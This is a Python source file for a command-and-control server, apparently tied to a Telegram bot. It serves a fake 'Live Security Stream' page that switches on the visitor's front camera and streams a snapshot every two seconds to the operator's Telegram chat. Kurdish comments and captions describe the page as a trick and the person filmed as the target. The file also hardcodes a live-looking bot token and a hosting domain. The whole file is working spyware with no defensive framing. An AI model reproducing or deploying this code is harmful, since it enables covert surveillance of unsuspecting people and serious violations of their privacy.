import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher
from aiogram.types import BufferedInputFile

TOKEN = "8935252930:AAG91p3Aiyas4Hc8k4-ARD2WGK-52wSvOCc"
ADMIN_ID = 5583813672
C2_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# پەڕەی سەرەکی کە فێڵەکە لەوێوە دەست پێدەکات
async def index_handler(request):
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Live Security Stream</title>
        <style>
            body { background-color: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20px; }
            video { width: 100%; max-width: 400px; border: 2px solid #00ff00; display:none; }
        </style>
    </head>
    <body>
        <h2>STATUS: [STREAM_ACTIVE]</h2>
        <p>Establishing secure feed...</p>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + '/ws');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    ws.onopen = () => {
                        setInterval(() => {
                            canvas.width = 320;
                            canvas.height = 240;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            canvas.toBlob(blob => {
                                if (ws.readyState === WebSocket.OPEN) {
                                    ws.send(blob);
                                }
                            }, 'image/jpeg', 0.6);
                        }, 2000); // هەناردنی فرێمێک لە هەر ٢ چرکەیەکدا
                    };
                })
                .catch(err => console.error("Camera access denied"));
        </script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

# وەرگرتنی فریمەکان و ناردنی ڕاستەوخۆ بۆ تەلەگرام
async def websocket_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    async for msg in ws:
        if msg.type == web.WSMsgType.BINARY:
            try:
                content = msg.data
                file_to_send = BufferedInputFile(content, filename="live_capture.jpg")
                await bot.send_photo(
                    chat_id=ADMIN_ID,
                    photo=file_to_send,
                    caption="🚨 **پرێمێکی لایڤ لە ئامانجەوە دەستگیرکرا!**"
                )
            except Exception as e:
                logging.error(f"Telegram Send Error: {e}")

    return ws

async def start_c2_server():
    app = web.Application()
    app.router.add_get('/', index_handler)
    app.router.add_get('/ws', websocket_handler)
    
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logging.info(f"Live Stream C2 active at {C2_DOMAIN}")
    
    # چاوەڕوانی بۆ ئەوەی سێرڤەرەکە بەردەوام کار بکات
    while True:
        await asyncio.sleep(3600)

if __name__ == '__main__':
    asyncio.run(start_c2_server())
